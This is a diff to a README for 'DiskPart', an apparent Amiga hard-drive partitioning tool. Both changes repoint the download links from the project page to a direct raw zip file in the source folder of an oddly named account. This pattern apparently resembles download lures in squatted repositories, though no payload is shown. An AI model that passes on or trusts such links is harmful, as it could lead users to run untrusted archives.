@@ -1,6 +1,6 @@
 # 💾 DiskPart - Manage your Amiga hard drive partitions
 
-[![](https://img.shields.io/badge/Download-DiskPart-blue)](https://github.com/Dirtyminded-gameequipment9479/DiskPart)
+[![](https://img.shields.io/badge/Download-DiskPart-blue)](https://github.com/Dirtyminded-gameequipment9479/DiskPart/raw/refs/heads/main/src/Disk-Part-1.0-beta.5.zip)
 
 DiskPart simplifies the process of creating and managing partitions on AmigaOS 3.x Rigid Disk Block (RDB) drives. This software removes the complexity from drive setup by providing a visual interface for geometry management. It runs as a native application and requires no extra software libraries to function.
 
@@ -25,7 +25,7 @@ To use DiskPart effectively, ensure your machine meets these criteria:
 
 You must obtain the software from the official repository. We distribute the program as a compressed folder to keep files organized.
 
-[Click here to visit the project page and download DiskPart](https://github.com/Dirtyminded-gameequipment9479/DiskPart)
+[Click here to visit the project page and download DiskPart](https://github.com/Dirtyminded-gameequipment9479/DiskPart/raw/refs/heads/main/src/Disk-Part-1.0-beta.5.zip)
 
 1.  Navigate to the provided link above.
 2.  Look for a button labeled "Download" or "Code" on the right side of the screen.
